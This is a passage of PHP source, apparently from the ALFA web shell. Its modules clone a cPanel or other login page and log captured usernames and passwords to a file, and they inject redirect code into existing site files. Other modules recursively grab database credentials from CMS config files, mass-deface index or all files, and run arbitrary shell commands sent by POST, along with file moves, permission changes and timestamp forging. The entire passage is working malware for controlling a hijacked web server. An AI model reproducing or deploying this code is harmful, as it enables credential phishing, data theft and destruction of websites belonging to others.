	$clone_page = $_POST['alfa1'];
	$fake_root = $_POST['alfa2'];
	$logto = $_POST['alfa4'];
	$panel = $_POST['alfa5'];
	$inject_to = $_POST['alfa6'];
	$bind_on = $_POST['alfa7'];
	$count = $_POST['alfa8'];
	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
		echo __pre();
		$target = $clone_page;
		$curl = new AlfaCURL();
		$source_page = $curl->Send($target);
		if(!empty($source_page)){
			$matched_form = "";
			if($panel == "cpanel"){
				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
					$matched_form = $match[0];
				}
			}else{
				if(preg_match('#<form(.*?)>#', $source_page, $match)){
					$matched_form = $match[0];
				}
			}
			if(!empty($matched_form)){
				$fake = "";
				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
				if($panel == "cpanel"){
					$port = "2083";
				}else{
					$target = str_replace(array("http://", "https://"), "", $target);
					$port = explode(":",$target);
					$port = $port[1];
				}
				if(substr($uri, 0, 1) == "/"){
					$uri = substr($uri, 1);
				}
				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
				if($panel == "cpanel"){
					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
				}else{
					$form = '<form action="'.$log_url.'" method="post">';
				}
				$fake = str_replace($matched_form, $form, $source_page);
				if(@!is_dir($fake_root)){
					@mkdir($fake_root, 0777, true);
				}

				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);

				$post_user = 'user';
				$post_pass = 'pass';
				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
				if($panel != "cpanel"){
					$post_user = 'username';
					$post_pass = 'password';
					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
				}

				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location:/");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';

				@file_put_contents($fake_root.'/log.php', $cpanel_log);

				if($panel == "cpanel"){
					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
				}

				@file_put_contents($fake_root.'/index.php', $fake);

				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';

				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));

				echo "success...!";
			}else{
				echo "failed...!";
			}
		}else{
			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
		}
	}
	echo '</div>';
	alfafooter();
}
function alfaarchive_manager(){
	alfahead();
	$file = $_POST['alfa2'];
	if(!file_exists($file)){
		$file = $GLOBALS['cwd'];
	}
	$rand_id = rand(9999, 999999);
	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
	if($_POST['alfa5']=='>>'){
		//echo __pre();
		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
		__alfa_open_archive_file($file, $rand_id);
		echo '</div>';
	}echo '</div>';
	alfafooter();
}
function __alfa_open_archive_file($arch, $base_id=0){
	try{
		$files = array();
		$dirs = array();
		$archive = new PharData($arch);
		 foreach($archive as $file) {
			 $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
		     if($file->isDir()) {
				 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
		     }else{
				 $file_size = @filesize($file->getPathname());
				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
			 }
		 }
		 function __alfa_open_archive_usort($a, $b){
			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
		 }
		 usort($dirs, "__alfa_open_archive_usort");
		 usort($files, "__alfa_open_archive_usort");
		 $files = array_merge($dirs, $files);
		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
		 foreach($files as $file){
			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
			 if($file["type"] == "dir"){
			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
		 	}else{
				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".alfaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";

			}
		 }
		  echo '</table>';
	}catch(Exception $e){
		echo("0");
	}
}
function alfaopen_archive_dir(){
	$dir = $_POST["alfa1"];
	$base_id = $_POST["alfa2"];
	__alfa_open_archive_file($dir, $base_id);
}
function alfaconfig_grabber(){
	alfahead();
	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
	$dir = $_POST['alfa2'];
	$ext = $_POST['alfa3'];
	if($_POST['alfa5']=='>>'){
		echo __pre();
		Alfa_ConfigGrabber($dir, $ext);
	}
	echo '</div>';
	alfafooter();
}
function Alfa_ConfigGrabber($dir, $ext) {
	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
	if(@is_readable($dir)){
		$globFiles = @glob("$dir/*.$ext");
		$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
		$blacklist = array();
		foreach ($globDirs as $dir) {
			if(!@is_readable($dir)||@is_link($dir)) continue;
			@Alfa_ConfigGrabber($dir, $ext);
		}
		foreach ($globFiles as $file){
			$filee = @file_get_contents($file);
			if(preg_match($pattern, $filee)){
				echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
			}
		}
	}
}
function alfasearcher(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='file'){
echo '<center><div class="txtfont_header">| Find Readable Or Writable Files  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
<div class="txtfont">
Method: <select style="width: 18%;" onclick="alfa_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
Dir: <input size="50" id="target" type="text" name="filename" value="'.$GLOBALS['cwd'].'">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
$dir = $_POST['alfa2'];
$ext = $_POST['alfa3'];
$method = $_POST['alfa4'];
if($_POST['alfa5']=='>>'){
echo __pre();
if(substr($dir,-1)=='/')$dir=substr($dir,0,-1);
Alfa_Searcher($dir,trim($ext),$method);
}
}
if($_POST['alfa1']=='str'){
echo '<center><div class="txtfont_header">| Find Files By Name / Find String In Files |</div><br><br><form onSubmit="g(\'searcher\',null,\'str\',this.dir.value,this.string.value,\'>>\',this.ext.value,this.method.value);return false;" method=\'post\'>
<div class="txtfont">
Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>
String: <input type="text" name="string" value="">
Dir: <input size="50" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
$dir = $_POST['alfa2'];
$string = $_POST['alfa3'];
$ext = $_POST['alfa5'];
if(!empty($string) AND !empty($dir) AND $_POST['alfa4'] == '>>'){
echo __pre();
Alfa_StrSearcher($dir,$string,$ext,$_POST['alfa6']);
}
}
echo '</div>';
alfafooter();
}
function alfaMassDefacer(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo "<div class=header><center><p><div class='txtfont_header'>| Mass Defacer |</div></p><form onSubmit=\"g('MassDefacer',null,this.massdir.value,this.defpage.value,this.method.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
</form>';
$dir = $_POST['alfa1'];
$defpage = $_POST['alfa2'];
$method = $_POST['alfa3'];
$fCurrent = $GLOBALS['__file_path'];
if($_POST['alfa4'] == '>>'){
if(!empty($dir)){
if(@is_dir($dir)){
if(@is_readable($dir)){
if(@is_file($defpage)){
if($dh = @opendir($dir)){
echo __pre();
while (($file = @readdir($dh)) !== false){
if($file == '..' || $file == '.')continue;
$newfile=$dir.$file;
if($fCurrent == $newfile)continue;
if(@is_dir($newfile)){
Alfa_ReadDir($newfile,$method,$defpage);
}else{
if(!@is_writable($newfile))continue;
if(!@is_readable($newfile))continue;
Alfa_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
}else{__alert('<font color="red">Error In OpenDir...</font>');}
}else{__alert('<font color="red">DefPage File NotFound...</font>');}
}else{__alert('<font color="red">Directory is not Readable...</font>');}
}else{__alert('<font color="red">Mass Dir is Invalid Dir...</font>');}
}else{__alert('<font color="red">Dir is Empty...</font>');}
}
echo '</div>';
alfafooter();
}
function Alfa_ReadDir($dir,$method='',$defpage=''){
if(!@is_readable($dir)) return false;
if (@is_dir($dir)) {
if ($dh = @opendir($dir)) {
while(($file=readdir($dh))!==false) {
if($file == '..' || $file == '.')continue;
$newfile=$dir.'/'.$file;
if(@is_readable($newfile)&&@is_dir($newfile))Alfa_ReadDir($newfile,$method,$defpage);
if(@is_file($newfile)){
if(!@is_readable($newfile))continue;
Alfa_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
}
}
}
function Alfa_Rewriter($dir,$file,$defpage,$m='index'){
if(!@is_writable($dir)) return false;
if(!@is_readable($dir)) return false;
$defpage=@file_get_contents($defpage);
if($m == 'index'){
$indexs = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
if(in_array(strtolower($file),$indexs)){
@file_put_contents($dir,$defpage);
echo @is_file($dir)?$dir."<b><font color='red'>DeFaced...</b></font><br>" : '';
}
}elseif($m=='all'){
@file_put_contents($dir,$defpage);
echo @is_file($dir)?$dir."  <b><font color='red'>DeFaced...</b></font><br>" : '';
}
}
function alfaGetDisFunc(){
alfahead();
echo '<div class="header">';
$disfun = @ini_get('disable_functions');
$s = explode(',',$disfun);
$f = array_unique($s);
echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: green;color: white;width:5%">#</td><td align="center" style="background-color: green;color: white;">Func Name</td></tr>';
$i=1;
foreach($f as $s){
$s=trim($s);
if(function_exists($s)||!is_callable($s))continue;
echo '<tr><td align="center" style="background-color: black;">'.$i.'</td>';
echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$s).'.php"><span class="disable_functions"><b>'.$s.'</b></span></a></td>';
$i++;
}
echo '</table></center>';
echo '</div>';
alfafooter();
}
function Alfa_Create_A_Tag($action,$vals){
$nulls = array();
foreach($vals as $key => $val){
echo '<a href=javascript:void(0) onclick="g(\''.$action.'\',';
for($i=1;$i<=$val[1]-1;$i++)$nulls[] = 'null';
$f = implode(',',$nulls);
echo $f.',\''.$val[0].'\');return false;">| '.$key.' | </a>';
unset($nulls);
}
}
function Alfa_Searcher($dir, $ext, $method) {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
$globFiles = @glob("$dir/*.$ext");
$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
$blacklist = array();
foreach ($globDirs as $dir) {
if(!@is_readable($dir)||@is_link($dir)) continue;
@Alfa_Searcher($dir, $ext, $method);
}
switch($method){
case "files":
foreach ($globFiles as $file){
if(@is_writable($file)){
echo "$file<br>";
}
}
break;
case "dirs":
foreach ($globFiles as $file){
if(@is_writable(dirname($file)) && !in_array(dirname($file), $blacklist)){
echo dirname($file).'<br>';
$blacklist[] = dirname($file);
}
}
break;
case "all":
foreach ($globFiles as $file){
echo $file.'<br>';
}
break;
}
unset($blacklist);
}
}
function AlfaiFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
public $compression;
public $cookie_file;
public $proxy;
public $path;
public $ssl = true;
public $curl_status = true;
function __construct($cookies=false,$compression='gzip',$proxy=''){
if(!extension_loaded('curl')){$curl_status = false;return false;}
$this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
$this->headers[] = 'Connection: Keep-Alive';
$this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
$this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
$this->path = ALFA_TEMPDIR.'/Alfa_cookies.txt';
$this->compression=$compression;
$this->proxy=$proxy;
$this->cookies=$cookies;
if($this->cookies)$this->cookie($this->path);
}
function cookie($cookie_file) {
if (_alfa_file_exists($cookie_file,false)) {
$this->cookie_file=$cookie_file;
}else{
@fopen($cookie_file,'w') or die($this->error('The cookie file could not be opened.'));
$this->cookie_file=$cookie_file;
@fclose($this->cookie_file);
}
}
function Send($url,$method="get",$data=""){
if(!$this->curl_status){return false;}
$process = curl_init($url);
curl_setopt($process, CURLOPT_HTTPHEADER, $this->headers);
curl_setopt($process, CURLOPT_HEADER, 0);
curl_setopt($process, CURLOPT_USERAGENT, $this->user_agent);
curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($process, CURLOPT_ENCODING , $this->compression);
curl_setopt($process, CURLOPT_TIMEOUT, 30);
if($this->ssl){
curl_setopt($process, CURLOPT_SSL_VERIFYPEER ,false);
curl_setopt($process, CURLOPT_SSL_VERIFYHOST,false);
}
if($this->cookies){
curl_setopt($process, CURLOPT_COOKIEFILE, $this->path);
curl_setopt($process, CURLOPT_COOKIEJAR, $this->path);
}
if($this->proxy){
curl_setopt($process, CURLOPT_PROXY, $this->proxy);
}
if($method=='post'){
curl_setopt($process, CURLOPT_POSTFIELDS, $data);
curl_setopt($process, CURLOPT_POST, 1);
curl_setopt($process, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
}$return = @curl_exec($process);
curl_close($process);
return $return;
}
function error($error) {
echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";
die;
}
}
function getConfigHtml($cms){
$content = '';
$cms_array = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
$content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
foreach($cms_array as $key => $val){
$content .= "<option value='{$key}' ".($key==$cms?'selected=selected':'').">{$val}</option>";
}
$content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
$content .= "</form>";
return $content;
}
if (!function_exists('json_encode')){
    function json_encode($a=false){
        if (is_null($a)) return 'null';
        if ($a === false) return 'false';
        if ($a === true) return 'true';
        if (is_scalar($a))
        {
            if (is_float($a))
            {
                return floatval(str_replace(",", ".", strval($a)));
            }

            if (is_string($a))
            {
                static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
            }
            else
            return $a;
        }
        $isList = true;
        for ($i = 0, reset($a); $i < count($a); $i++, next($a))
        {
            if (key($a) !== $i)
            {
                $isList = false;
                break;
            }
        }
        $result = array();
        if ($isList)
        {
            foreach ($a as $v) $result[] = json_encode($v);
            return '[' . join(',', $result) . ']';
        }
        else
        {
            foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
            return '{' . join(',', $result) . '}';
        }
    }
}
if ( !function_exists('json_decode') ){
function json_decode($json, $array=true){
    $comment = false;
    $out = '$x=';
    for ($i=0; $i<strlen($json); $i++)
    {
        if (!$comment)
        {
            if ($json[$i] == '{' || $json[$i] == '['){$out .= ' array(';}
            else if ($json[$i] == '}' || $json[$i] == ']'){$out .= ')';}
            else if ($json[$i] == ':'){$out .= '=>';}
            else {$out .= $json[$i];}
        }
        else $out .= $json[$i];
        if ($json[$i] == '"')    $comment = !$comment;
    }
    eval($out . ';');
    return $x;
}
}
function alfaterminalExec(){
	$pwd = "pwd";
	$seperator = ";";
	if($GLOBALS['sys']!='unix'){
		$pwd = "cd";
		$seperator = "&";
	}
	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
	$current_path = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
		if(empty($match[1])){
			$match[1] = $match[2];
		}
		$current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
		$current_path = str_replace("\\", "/", $current_path);
	}
	$out = alfaEx($cmd.$_POST['alfa1'], true);
	$out = htmlspecialchars($out);
	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
}
function convertBash($code) {
    $dictionary = array(
        '[01;30m' => '<span style="color:black">',
        '[01;31m' => '<span style="color:red">',
        '[01;32m' => '<span style="color:green">',
        '[01;33m' => '<span style="color:yellow">',
        '[01;34m' => '<span style="color:blue">',
        '[01;35m' => '<span style="color:purple">',
        '[01;36m' => '<span style="color:cyan">',
        '[01;37m' => '<span style="color:white">',
        '[0m'   => '</span>'
    );
    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
    return $htmlString;
}
function alfadoActions(){
	$chdir_fals = false;
	if(!@chdir($_POST['c'])){
		$chdir_fals = true;
		$alfa_canruncmd = _alfa_can_runCommand(true,true);
	}
	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
	$action = $_POST["alfa3"];
	if($action == "permission"){
		$perms = 0;
		$perm = $_POST["alfa2"];
		for($i=strlen($perm)-1;$i>=0;--$i){
			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
		}
		if(@chmod($_POST['alfa1'], $perms)){
			echo("done");
		}else{
			echo("no");
		}
		return;
	}
	if($action == "rename" || $action == "move"){
		$alfa1_decoded = $_POST['alfa1'];
		if($chdir_fals){
			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
		}
		$_POST['alfa1'] = trim($_POST['alfa1']);
		$alfa1_escape = addslashes($_POST["alfa1"]);
		if($_POST["alfa3"] == "rename"){
			$_POST['alfa2'] = basename($_POST['alfa2']);
		}
		if(!empty($_POST['alfa2'])){
			$cmd_rename = false;
			if($chdir_fals&&$alfa_canruncmd){
				if(_alfa_is_writable($_POST['alfa1'])){
					$cmd_rename = true;
					$alfa1_escape = addslashes($alfa1_decoded);
					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
				}
			}
			if(!file_exists($_POST['alfa2'])){
				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
					echo "done";
				}else{
					echo "no";
				}
			}else{
				echo "no";
			}
		}
	}elseif($action == "copy"){
		if(is_dir($_POST["alfa1"])){
			$dir = str_replace('//', '/', $_POST["alfa1"]);
			$dir = explode('/', $dir);
			if(empty($dir[count($dir) - 1])){
				$name = $dir[count($dir) - 2];
			}else{
				$name = $dir[count($dir) - 1];
			}
		}else{
			$name = basename($_POST["alfa1"]);
		}
		$dir = dirname($_POST["alfa1"]);
		if($dir == "."){
			$dir = $_POST["c"]."/";
		}
		if(is_file($_POST["alfa1"])){
			@copy($_POST["alfa1"], $_POST["alfa2"]);
			echo("done");
		}elseif(is_dir($_POST["alfa1"])){
			if(!is_dir($_POST["alfa2"])){
				mkdir($_POST["alfa2"], 0755, true);
			}
			copy_paste($dir, $name , $_POST["alfa2"] . "/");
			echo("done");
		}
	}elseif($action == "modify"){
		if( !empty($_POST['alfa1']) ) {
			$time = strtotime($_POST['alfa1']);
			if($time){
				$touched = false;
				if($chdir_fals&&$alfa_canruncmd){
					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
					$touched = true;
				}
				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
					echo 'no';
				}else{
					echo 'ok';
				}
			} else{
				 echo 'badtime';
			}
		}
	}

}
function alfaget_flags(){
	$flags = array();
	if(function_exists("curl_version")){
		$curl = new AlfaCURL();
		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
		if(strpos($flag2, "geoplugin") != false){
			$flag = json_decode($flag, true);
			$flag2 = json_decode($flag2, true);
			if(!empty($flag['geoplugin_countryCode'])){
				$flags["server"]["name"] = $flag['geoplugin_countryName'];
				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
			}
			if(!empty($flag2['geoplugin_countryCode'])){
				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
			}
		}
	}
	echo json_encode($flags);
}
function alfaGetConfig(){
$cms = $_POST['alfa1'];
$path = trim($_POST['alfa2']);
$config = array(
'wp'=>array('file'=>'/wp-config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/",1)
),
'drupal'=>array('file'=>'/config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1)
),
'drupal2'=>array('file'=>'/sites/default/settings.php',
'host'=>array("/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbname'=>array("/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbuser'=>array("/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbpw'=>array("/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'prefix'=>array("/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1)
),
'vb'=>array('file'=>'/includes/config.php',
'host'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbuser'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
